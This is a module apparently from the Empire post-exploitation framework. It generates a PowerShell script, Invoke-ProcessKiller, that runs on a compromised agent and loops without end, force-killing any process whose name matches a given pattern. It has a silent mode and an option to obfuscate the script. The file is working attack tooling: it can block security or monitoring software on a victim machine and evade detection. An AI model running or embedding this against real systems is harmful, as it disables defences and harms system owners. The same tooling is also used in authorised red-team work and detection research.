import base64
from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-ProcessKiller',

            'Author': ['@harmj0y'],

            'Description': ("Kills any process starting with a particular name."),

            'Background' : True,

            'OutputExtension' : None,
            
            'NeedsAdmin' : False,

            'OpsecSafe' : False,

            'Language' : 'powershell',

            'MinLanguageVersion' : '2',
            
            'Comments': [ ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'ProcessName' : {
                'Description'   :   'Process name to kill on starting (wildcards accepted).',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Sleep' : {
                'Description'   :   'Time to sleep between checks.',
                'Required'      :   True,
                'Value'         :   '1'
            },
            'Silent' : {
                'Description'   :   "Switch. Don't output kill messages.",
                'Required'      :   False,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):
        
        script = """
function Invoke-ProcessKiller {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ProcessName,

        [Parameter(Position = 1)]
        [Int]
        $Sleep = 1,

        [Parameter(Position = 2)]
        [Switch]
        $Silent
    )

    "Invoke-ProcessKiller monitoring for $ProcessName every $Sleep seconds"

    while($true){
        Start-Sleep $Sleep
        
        Get-Process $ProcessName | % {
            if (-not $Silent) {
                "`n$ProcessName process started, killing..."
            }
            Stop-Process $_.Id -Force
        }
    }
}
Invoke-ProcessKiller"""


        for option,values in self.options.iteritems():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        script += " -" + str(option)
                    else:
                        script += " -" + str(option) + " " + str(values['Value']) 
        
        if obfuscate:
            script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
        return script
